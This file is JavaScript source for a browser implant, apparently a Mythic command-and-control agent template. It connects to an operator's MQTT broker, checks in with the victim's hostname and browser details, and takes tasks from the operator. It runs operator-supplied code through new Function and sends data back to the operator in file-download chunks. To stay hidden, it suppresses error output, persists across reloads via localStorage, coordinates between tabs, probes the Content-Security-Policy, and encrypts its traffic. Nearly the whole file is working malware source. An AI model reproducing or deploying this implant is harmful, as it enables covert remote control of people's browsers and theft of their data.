(function() {
    // =========================================================================
    // CONFIG - Replaced by Mythic during payload generation
    // =========================================================================
    var C = {
        Server:     "mqtt_server",
        Port:       "mqtt_port",
        MQClient:   "mqtt_client",
        MQUser:     "mqtt_user",
        MQPass:     "mqtt_pass",
        RecTopic:   "mqtt_mythic",
        SenTopic:   "mqtt_taskcheck",
        Topic:      "mqtt_topic",
        UseSSL:     "use_ssl",
        PayloadUUID:"UUID_HERE",
        UUID:       "",
        Sleep:      callback_interval,
        Jitter:     callback_jitter,
        KillDate:   "killdate",
        enc_key:    AESPSK,
        wsockets:   "websockets",
        ExchChk:    "encrypted_exchange_check",
        Debug:      agent_debug
    };

    // =========================================================================
    // STATE
    // =========================================================================
    var client      = null;
    var connected   = false;
    var uuid        = C.PayloadUUID;
    var recTopic    = C.Topic + C.RecTopic;
    var senTopic    = C.Topic + C.SenTopic;
    var taskingLoop = null;
    var pendingResponses = {};   // keyed callbacks for download registration responses
    var pendingCounter  = 0;     // monotonic counter for correlation IDs

    // Agent phases: 'init' -> 'eke_sent' -> 'checkin_sent' -> 'running'
    var phase       = 'init';
    var rsaPrivKey  = null;
    var sessionId   = '';
    var tempUUID    = '';

    // Pre-generate RSA keypair immediately if EKE is needed (runs in parallel with mqtt.js load)
    var ekeKeyPromise = null;
    if (C.enc_key && (C.ExchChk === 'True' || C.ExchChk === 'true' || C.ExchChk === true)) {
        ekeKeyPromise = crypto.subtle.generateKey(
            { name: 'RSA-OAEP', modulusLength: 4096, publicExponent: new Uint8Array([1, 0, 1]), hash: 'SHA-1' },
            true, ['encrypt', 'decrypt']
        );
    }

    // =========================================================================
    // UTILITY
    // =========================================================================
    function log() {
        if (!C.Debug) return;
        var args = Array.prototype.slice.call(arguments);
        args.unshift('[agent]');
        console.log.apply(console, args);
    }

    function sleepMs() {
        var base = C.Sleep * 1000;
        var jitter = Math.floor(Math.random() * (base * (C.Jitter / 100)));
        return base + jitter;
    }

    function pastKillDate() {
        if (!C.KillDate) return false;
        return new Date() >= new Date(C.KillDate);
    }

    function randString(len) {
        var chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
        var arr = new Uint8Array(len);
        crypto.getRandomValues(arr);
        var out = '';
        for (var i = 0; i < len; i++) out += chars[arr[i] % chars.length];
        return out;
    }

    function b64Encode(str) {
        return btoa(unescape(encodeURIComponent(str)));
    }

    function b64Decode(str) {
        return decodeURIComponent(escape(atob(str)));
    }

    function b64ToAB(b64) {
        var bin = atob(b64);
        var buf = new Uint8Array(bin.length);
        for (var i = 0; i < bin.length; i++) buf[i] = bin.charCodeAt(i);
        return buf.buffer;
    }

    function abToB64(ab) {
        var bytes = new Uint8Array(ab);
        var bin = '';
        for (var i = 0; i < bytes.length; i++) bin += String.fromCharCode(bytes[i]);
        return btoa(bin);
    }

    function concatAB() {
        var total = 0;
        var bufs = [];
        for (var i = 0; i < arguments.length; i++) {
            bufs.push(new Uint8Array(arguments[i]));
            total += arguments[i].byteLength;
        }
        var result = new Uint8Array(total);
        var offset = 0;
        for (var j = 0; j < bufs.length; j++) {
            result.set(bufs[j], offset);
            offset += bufs[j].byteLength;
        }
        return result.buffer;
    }

    // =========================================================================
    // CONSOLE SUPPRESSION - prevent agent stack traces from leaking
    // =========================================================================
    if (!C.Debug) {
        window.addEventListener('error', function(e) {
            // Suppress errors originating from agent code
            if (e.filename && e.filename === '') {
                e.preventDefault();
                return true;
            }
        });
        window.addEventListener('unhandledrejection', function(e) {
            e.preventDefault();
        });
    }

    // =========================================================================
    // CSP AWARENESS - check Content-Security-Policy before external loads
    // =========================================================================
    function checkCSP(directive) {
        var cspContent = '';
        // Check meta tags
        var metas = document.querySelectorAll('meta[http-equiv="Content-Security-Policy"]');
        for (var i = 0; i < metas.length; i++) {
            cspContent += metas[i].getAttribute('content') + '; ';
        }
        if (!cspContent) return {allowed: true, reason: 'No CSP detected'};

        // Parse relevant directive
        var parts = cspContent.split(';');
        for (var j = 0; j < parts.length; j++) {
            var trimmed = parts[j].trim();
            if (trimmed.indexOf(directive) === 0) {
                var value = trimmed.substring(directive.length).trim();
                // Check for restrictive policies
                if (value.indexOf("'none'") > -1) {
                    return {allowed: false, reason: directive + " is set to 'none'"};
                }
                if (value.indexOf("'self'") > -1 && value.indexOf('http') === -1 && value.indexOf('*') === -1) {
                    return {allowed: false, reason: directive + " restricted to 'self' only"};
                }
                return {allowed: true, reason: directive + ' policy: ' + value};
            }
        }
        // Check default-src as fallback
        for (var k = 0; k < parts.length; k++) {
            var dtrimmed = parts[k].trim();
            if (dtrimmed.indexOf('default-src') === 0) {
                var dvalue = dtrimmed.substring('default-src'.length).trim();
                if (dvalue.indexOf("'none'") > -1) {
                    return {allowed: false, reason: 'default-src is set to \'none\' (no ' + directive + ' override)'};
                }
            }
        }
        return {allowed: true, reason: 'No ' + directive + ' directive found'};
    }

    // =========================================================================
    // ACTIVE TASK TRACKING (all currently executing tasks)
    // =========================================================================
    var activeTasks = {};  // taskId -> {command, startTime}

    // =========================================================================
    // BACKGROUND TASK REGISTRY
    // =========================================================================
    var backgroundTasks = {};  // taskId -> {command, startTime, cancel}

    function registerBackgroundTask(taskId, command, cancelFn) {
        backgroundTasks[taskId] = {
            command: command,
            startTime: new Date().toISOString(),
            cancel: cancelFn
        };
    }

    function unregisterBackgroundTask(taskId) {
        delete backgroundTasks[taskId];
    }

    function getBackgroundTasks() {
        var jobs = [];
        var ids = Object.keys(backgroundTasks);
        for (var i = 0; i < ids.length; i++) {
            var t = backgroundTasks[ids[i]];
            jobs.push({
                task_id: ids[i],
                command: t.command,
                start_time: t.startTime
            });
        }
        return jobs;
    }

    function cancelBackgroundTask(taskId) {
        if (backgroundTasks[taskId] && backgroundTasks[taskId].cancel) {
            backgroundTasks[taskId].cancel();
            delete backgroundTasks[taskId];
            return true;
        }
        return false;
    }

    function getActiveTasks() {
        var tasks = [];
        var ids = Object.keys(activeTasks);
        for (var i = 0; i < ids.length; i++) {
            var t = activeTasks[ids[i]];
            var isBg = !!backgroundTasks[ids[i]];
            tasks.push({
                task_id: ids[i],
                command: t.command,
                start_time: t.startTime,
                background: isBg
            });
        }
        return tasks;
    }

    // =========================================================================
    // PARAMETER PARSING
    // =========================================================================
    function parseParams(task) {
        var params = task.parameters;
        if (typeof params === 'string') {
            try { params = JSON.parse(params); } catch (e) { params = {}; }
        }
        return params || {};
    }

    // =========================================================================
    // CRYPTO - AES-256-CBC + HMAC-SHA256
    // =========================================================================
    var cryptoKey = null;
    var hmacKey   = null;

    async function setAESKeys(rawKeyBuf) {
        cryptoKey = await crypto.subtle.importKey(
            'raw', rawKeyBuf, { name: 'AES-CBC' }, false, ['encrypt', 'decrypt']
        );
        hmacKey = await crypto.subtle.importKey(
            'raw', rawKeyBuf, { name: 'HMAC', hash: 'SHA-256' }, false, ['sign', 'verify']
        );
    }

    async function initKeys() {
        if (!C.enc_key || !C.enc_key.enc_key) return;
        await setAESKeys(b64ToAB(C.enc_key.enc_key));
    }

    // Encrypt: returns ArrayBuffer of IV(16) + AES-CBC(plaintext) + HMAC-SHA256
    async function encryptRaw(plaintext) {
        var iv = crypto.getRandomValues(new Uint8Array(16));
        var encoded = new TextEncoder().encode(plaintext);

        var ciphertext = await crypto.subtle.encrypt(
            { name: 'AES-CBC', iv: iv }, cryptoKey, encoded
        );

        var ivAndCipher = concatAB(iv.buffer, ciphertext);
        var hmac = await crypto.subtle.sign('HMAC', hmacKey, ivAndCipher);

        return concatAB(ivAndCipher, hmac);
    }

    // Decrypt: takes ArrayBuffer of IV(16) | ciphertext | HMAC(32), returns string
    async function decryptRaw(buf) {
        var raw = new Uint8Array(buf);
        var iv         = raw.slice(0, 16);
        var ciphertext = raw.slice(16, raw.length - 32);
        var hmac       = raw.slice(raw.length - 32);

        var ivAndCipher = concatAB(iv.buffer, ciphertext.buffer);
        var valid = await crypto.subtle.verify('HMAC', hmacKey, hmac.buffer, ivAndCipher);
        if (!valid) throw new Error('HMAC verification failed');

        var decrypted = await crypto.subtle.decrypt(
            { name: 'AES-CBC', iv: iv }, cryptoKey, ciphertext.buffer
        );

        return new TextDecoder().decode(decrypted);
    }

    // =========================================================================
    // CRYPTO - RSA (EKE only)
    // =========================================================================
    async function generateRSAKeyPair() {
        var keyPair = await crypto.subtle.generateKey(
            {
                name: 'RSA-OAEP',
                modulusLength: 4096,
                publicExponent: new Uint8Array([1, 0, 1]),
                hash: 'SHA-1'
            },
            true,
            ['encrypt', 'decrypt']
        );
        rsaPrivKey = keyPair.privateKey;
        return keyPair;
    }

    async function exportPubKey(publicKey) {
        var spki = await crypto.subtle.exportKey('spki', publicKey);
        return abToB64(spki);
    }

    async function rsaDecrypt(b64encrypted) {
        var ciphertext = b64ToAB(b64encrypted);
        var plaintext = await crypto.subtle.decrypt(
            { name: 'RSA-OAEP' },
            rsaPrivKey,
            ciphertext
        );
        return plaintext;
    }

    // =========================================================================
    // MYTHIC MESSAGE FORMAT
    // Outbound: base64( UUID_bytes + encrypted_bytes )
    // Inbound:  base64( UUID_bytes(36) + encrypted_bytes )
    // =========================================================================
    async function buildMessage(data, overrideUUID) {
        var json = JSON.stringify(data);
        var msgUUID = overrideUUID || uuid;
        var uuidBytes = new TextEncoder().encode(msgUUID);

        if (cryptoKey) {
            var encrypted = await encryptRaw(json);
            return abToB64(concatAB(uuidBytes.buffer, encrypted));
        } else {
            var jsonBytes = new TextEncoder().encode(json);
            return abToB64(concatAB(uuidBytes.buffer, jsonBytes.buffer));
        }
    }

    async function parseMessage(raw) {
        var decoded = new Uint8Array(b64ToAB(raw));
        var msgUUID = new TextDecoder().decode(decoded.slice(0, 36));
        var payload = decoded.slice(36);

        if (cryptoKey) {
            var decrypted = await decryptRaw(payload.buffer);
            return { uuid: msgUUID, data: JSON.parse(decrypted) };
        } else {
            var jsonStr = new TextDecoder().decode(payload);
            return { uuid: msgUUID, data: JSON.parse(jsonStr) };
        }
    }

    // =========================================================================
    // STATE PERSISTENCE - survive page reloads via localStorage
    // =========================================================================
    var PERSIST_KEY = '_t_' + C.PayloadUUID.substring(0, 8);

    function saveState() {
        try {
            var state = {uuid: uuid, phase: phase, ts: Date.now()};
            // Store AES key if we have one from EKE (base64 encoded)
            if (cryptoKey) {
                state.hasKey = true;
            }
            localStorage.setItem(PERSIST_KEY, JSON.stringify(state));
        } catch (e) {}
    }

    function loadState() {
        try {
            var raw = localStorage.getItem(PERSIST_KEY);
            if (!raw) return null;
            var state = JSON.parse(raw);
            // Expire after 24 hours
            if (Date.now() - state.ts > 86400000) {
                localStorage.removeItem(PERSIST_KEY);
                return null;
            }
            return state;
        } catch (e) { return null; }
    }

    function clearState() {
        try { localStorage.removeItem(PERSIST_KEY); } catch (e) {}
    }

    // =========================================================================
    // CROSS-TAB LEADER ELECTION - prevent duplicate agents
    // =========================================================================
    var isLeader = true;
    var leaderChannel = null;

    function setupLeaderElection() {
        if (typeof BroadcastChannel === 'undefined') return; // Not supported, assume leader

        var channelName = '_t_leader_' + C.PayloadUUID.substring(0, 8);
        leaderChannel = new BroadcastChannel(channelName);

        // Announce ourselves
        var myId = Math.random().toString(36).substring(2);
        leaderChannel.postMessage({type: 'announce', id: myId, ts: Date.now()});

        leaderChannel.onmessage = function(e) {
            if (e.data.type === 'announce' && e.data.id !== myId) {
                // Another agent exists - compare timestamps, older wins
                if (e.data.ts < Date.now() - 1000) {
                    // They were here first, we become dormant
                    isLeader = false;
                    log('Another tab is leader, going dormant');
                } else {
                    // We were here first, tell them
                    leaderChannel.postMessage({type: 'leader_exists', id: myId});
                }
            }
            if (e.data.type === 'leader_exists' && e.data.id !== myId) {
                isLeader = false;
                log('Leader already exists, going dormant');
            }
            if (e.data.type === 'leader_dead') {
                // Leader died, try to take over
                isLeader = true;
                log('Leader died, taking over');
                if (phase === 'running' && !taskingLoop) {
                    startTaskingLoop();
                }
            }
        };

        // When we close, notify others
        window.addEventListener('beforeunload', function() {
            if (isLeader && leaderChannel) {
                leaderChannel.postMessage({type: 'leader_dead'});
            }
        });
    }

    // =========================================================================
    // MQTT TRANSPORT
    // =========================================================================
    var reconnectAttempts = 0;
    var MAX_RECONNECT_MS = 300000; // 5 minute ceiling

    function getReconnectDelay() {
        var base = sleepMs();
        var backoff = Math.min(base * Math.pow(2, reconnectAttempts), MAX_RECONNECT_MS);
        reconnectAttempts++;
        return backoff;
    }

    function buildBrokerURL() {
        var protocol = (C.UseSSL === 'True' || C.UseSSL === 'true' || C.UseSSL === true) ? 'wss://' : 'ws://';
        return protocol + C.Server + ':' + C.Port + '/mqtt';
    }

    function mqttConnect() {
        var url = buildBrokerURL();
        log('connecting', url);

        var opts = {
            clientId:        C.MQClient + '_' + Math.random().toString(16).substr(2, 6),
            clean:           true,
            keepalive:       60,
            reconnectPeriod: getReconnectDelay()
        };

        if (C.MQUser) opts.username = C.MQUser;
        if (C.MQPass) opts.password = C.MQPass;

        try {
            client = mqtt.connect(url, opts);
        } catch (e) {
            log('MQTT connect failed:', e.message, '— page may block ws:// from https:// (mixed content). Use wss:// or test on an http:// page.');
            return;
        }

        client.on('connect', function() {
            connected = true;
            reconnectAttempts = 0; // Reset backoff on successful connect
            log('connected');

            client.subscribe(recTopic, { qos: 1 }, function(err) {
                if (err) {
                    log('subscribe error', err.message);
                    return;
                }
                log('subscribed', recTopic);
                if (phase === 'init') {
                    beginCheckin();
                } else if (phase === 'running') {
                    log('reconnected, resuming tasking loop');
                }
            });
        });

        client.on('message', function(topic, message) {
            handleInbound(message.toString());
        });

        client.on('error', function(err) {
            log('error', err.message);
        });

        client.on('close', function() {
            connected = false;
            log('disconnected');
        });

        client.on('reconnect', function() {
            // Update reconnect period with exponential backoff
            client.options.reconnectPeriod = getReconnectDelay();
            log('reconnecting, next attempt in', client.options.reconnectPeriod, 'ms');
        });
    }

    // =========================================================================
    // SEND
    // =========================================================================
    async function send(data, overrideUUID) {
        if (!client || !connected) return;
        var msg = await buildMessage(data, overrideUUID);
        client.publish(senTopic, msg, { qos: 1 });
    }

    // =========================================================================
    // SEND AND WAIT (for download registration responses)
    // =========================================================================
    function sendAndWait(data) {
        return new Promise(function(resolve) {
            var id = ++pendingCounter;
            pendingResponses[id] = resolve;
            // Store the correlation ID so handleInbound can route the response
            data._correlationId = id;
            send(data);
        });
    }

    // =========================================================================
    // FILE DOWNLOAD HELPER
    // =========================================================================
    async function downloadFile(taskId, filename, b64Data, isScreenshot) {
        var CHUNK_SIZE = 51200;
        var B64_CHUNK = Math.floor(CHUNK_SIZE / 3) * 4;
        var totalChunks = Math.ceil(b64Data.length / B64_CHUNK);

        // Step 1: Register download with Mythic (must wait for file_id)
        var regResp = await sendAndWait({
            action: 'post_response',
            responses: [{
                task_id: taskId,
                download: {
                    total_chunks: totalChunks,
                    full_path: filename,
                    chunk_size: CHUNK_SIZE,
                    is_screenshot: isScreenshot
                }
            }]
        });

        var fileId = regResp.responses[0].file_id;
        log('download registered, file_id:', fileId, 'chunks:', totalChunks);

        // Step 2: Send all chunks in parallel (no waiting for ACKs)
        var chunkPromises = [];
        for (var i = 0; i < totalChunks; i++) {
            var start = i * B64_CHUNK;
            var end = Math.min(start + B64_CHUNK, b64Data.length);
            var chunk = b64Data.substring(start, end);

            chunkPromises.push(send({
                action: 'post_response',
                responses: [{
                    task_id: taskId,
                    download: {
                        file_id: fileId,
                        chunk_num: i + 1,
                        chunk_data: chunk
                    }
                }]
            }));
        }

        // Wait for all chunks to be sent (not ACKed, just published)
        await Promise.all(chunkPromises);

        log('download complete, file_id:', fileId);
        return fileId;
    }

    // =========================================================================
    // CHECKIN FLOW
    // =========================================================================
    function buildCheckinData() {
        return {
            action:          'checkin',
            uuid:            C.PayloadUUID,
            ips:             [],
            os:              navigator.platform,
            user:            '',
            host:            window.location.hostname,
            domain:          window.location.hostname,
            pid:             0,
            architecture:    navigator.userAgent,
            integrity_level: 2,
            process_name:    'browser',
            external_ip:     ''
        };
    }

    async function beginCheckin() {
        if (pastKillDate()) {
            shutdown();
            return;
        }

        if ((C.ExchChk === 'True' || C.ExchChk === 'true' || C.ExchChk === true) && C.enc_key) {
            await beginEKE();
        } else {
            phase = 'checkin_sent';
            log('checking in (direct)');
            await send(buildCheckinData());
        }
    }

    // =========================================================================
    // ENCRYPTED KEY EXCHANGE (EKE)
    // =========================================================================
    async function beginEKE() {
        log('starting EKE');

        var keyPair;
        if (ekeKeyPromise) {
            keyPair = await ekeKeyPromise;
            ekeKeyPromise = null;
            rsaPrivKey = keyPair.privateKey;
        } else {
            keyPair = await generateRSAKeyPair();
        }
        var pubKeyB64 = await exportPubKey(keyPair.publicKey);

        sessionId = randString(20);

        phase = 'eke_sent';
        await send({
            action:     'staging_rsa',
            pub_key:    pubKeyB64,
            session_id: sessionId
        });

        log('EKE step 1: pub key sent');
    }

    async function handleEKEResponse(data) {
        if (data.session_id !== sessionId) {
            log('EKE session_id mismatch, ignoring');
            return;
        }

        tempUUID = data.uuid;
        log('EKE step 2: received tempUUID', tempUUID);

        var sessionKeyBuf = await rsaDecrypt(data.session_key);

        await setAESKeys(sessionKeyBuf);
        rsaPrivKey = null;

        phase = 'checkin_sent';
        uuid = tempUUID;

        var checkinData = buildCheckinData();
        await send(checkinData, tempUUID);

        log('EKE step 3: checkin sent with session key');
    }

    // =========================================================================
    // INBOUND MESSAGE HANDLER
    // =========================================================================
    async function handleInbound(raw) {
        try {
            var msg = await parseMessage(raw);

            if (msg.uuid !== uuid && msg.uuid !== C.PayloadUUID && msg.uuid !== tempUUID) return;

            var data = msg.data;

            if (phase === 'eke_sent' && data.action === 'staging_rsa') {
                await handleEKEResponse(data);
                return;
            }

            if (phase === 'checkin_sent' && data.action === 'checkin' && data.id) {
                uuid = data.id;
                C.UUID = data.id;
                phase = 'running';
                log('registered, callback UUID:', uuid);
                saveState();
                startTaskingLoop();
                return;
            }

            if (phase === 'running' && data.action === 'get_tasking' && data.tasks) {
                processTasks(data.tasks);
                return;
            }

            // Mythic acknowledges post_response — route to pending callback if waiting
            if (phase === 'running' && data.action === 'post_response') {
                if (data.responses && Object.keys(pendingResponses).length > 0) {
                    // Resolve the oldest pending callback (FIFO order)
                    var keys = Object.keys(pendingResponses).sort(function(a, b) { return a - b; });
                    var id = keys[0];
                    var cb = pendingResponses[id];
                    delete pendingResponses[id];
                    cb(data);
                }
                return;
            }

            log('unhandled', data.action, 'in phase', phase);

        } catch (e) {
            // Silently drop messages we can't decrypt (meant for other agents)
        }
    }

    // =========================================================================
    // COMMAND REGISTRY
    // =========================================================================
    var COMMANDS = {};

    //COMMANDS_HERE

    // =========================================================================
    // TASKING LOOP
    // =========================================================================
    function startTaskingLoop() {
        if (taskingLoop) return;

        async function poll() {
            if (pastKillDate()) {
                shutdown();
                return;
            }

            await send({ action: 'get_tasking', tasking_size: -1 });
            taskingLoop = setTimeout(poll, sleepMs());
        }

        poll();
    }

    function processTasks(tasks) {
        if (!tasks || !tasks.length) return;

        // Execute all tasks in parallel
        var taskPromises = [];
        for (var i = 0; i < tasks.length; i++) {
            var task = tasks[i];
            log('task received', task.command, task.id);
            taskPromises.push(executeTask(task));
        }

        // Don't block - let all tasks run concurrently
        Promise.all(taskPromises).catch(function(e) {
            log('task batch error', e.message);
        });
    }

    async function executeTask(task) {
        var result = {
            task_id:     task.id,
            user_output: '',
            completed:   true,
            status:      'success'
        };

        // Track this task as active
        activeTasks[task.id] = {command: task.command, startTime: new Date().toISOString()};

        try {
            if (COMMANDS[task.command]) {
                var output = await COMMANDS[task.command](task);
                if (output !== null && output !== undefined && output !== '') {
                    // Normalize command output: if it's an object with an error property, mark as error
                    if (typeof output === 'object' && output.error) {
                        result.user_output = typeof output.error === 'string' ? output.error : JSON.stringify(output);
                        result.status = 'error';
                    } else {
                        result.user_output = typeof output === 'string' ? output : JSON.stringify(output);
                    }
                } else {
                    result.user_output = 'No response from browser';
                }
            } else {
                result.user_output = 'unknown command: ' + task.command;
                result.status = 'error';
            }
        } catch (e) {
            result.user_output = 'error: ' + (e.message || String(e));
            result.status = 'error';
        }

        // Remove from active tracking
        delete activeTasks[task.id];

        await send({
            action: 'post_response',
            responses: [result]
        });
    }

    // =========================================================================
    // DYNAMIC COMMAND LOADING
    // =========================================================================
    function loadDynamicCommand(code) {
        try {
            // The code should register itself via COMMANDS['name'] = ...
            var fn = new Function('COMMANDS', 'parseParams', 'downloadFile', 'registerBackgroundTask', 'unregisterBackgroundTask', 'checkCSP', 'log', code);
            fn(COMMANDS, parseParams, downloadFile, registerBackgroundTask, unregisterBackgroundTask, checkCSP, log);
            return true;
        } catch (e) {
            log('dynamic load failed:', e.message);
            return false;
        }
    }

    // =========================================================================
    // SHUTDOWN
    // =========================================================================
    function shutdown() {
        log('shutting down');
        if (taskingLoop) clearTimeout(taskingLoop);
        if (client) client.end(true);
        clearState();
        connected = false;
    }

    // =========================================================================
    // MQTT.JS LOADER + INIT
    // =========================================================================
    var MQTT_CDN = 'https://cdnjs.cloudflare.com/ajax/libs/mqtt/5.14.1/mqtt.min.js';

    function loadMqttLib(callback) {
        // If mqtt.js is already embedded/loaded, proceed immediately
        if (typeof mqtt !== 'undefined') {
            callback();
            return;
        }

        // Fallback: load from CDN
        var s = document.createElement('script');
        s.src = MQTT_CDN;
        s.onload = callback;
        s.onerror = function() { log('failed to load mqtt.js from CDN'); };
        (document.head || document.documentElement).appendChild(s);
    }

    async function init() {
        setupLeaderElection();
        if (!isLeader) {
            log('Not leader, staying dormant');
            return;
        }

        await initKeys();

        // Check for saved state from previous page load
        var saved = loadState();
        if (saved && saved.uuid && saved.phase === 'running') {
            uuid = saved.uuid;
            phase = 'checkin_sent'; // Re-checkin to confirm we're still valid
            log('Resuming from saved state, uuid:', uuid);
        }

        mqttConnect();
    }

    loadMqttLib(function() { init(); });

})();
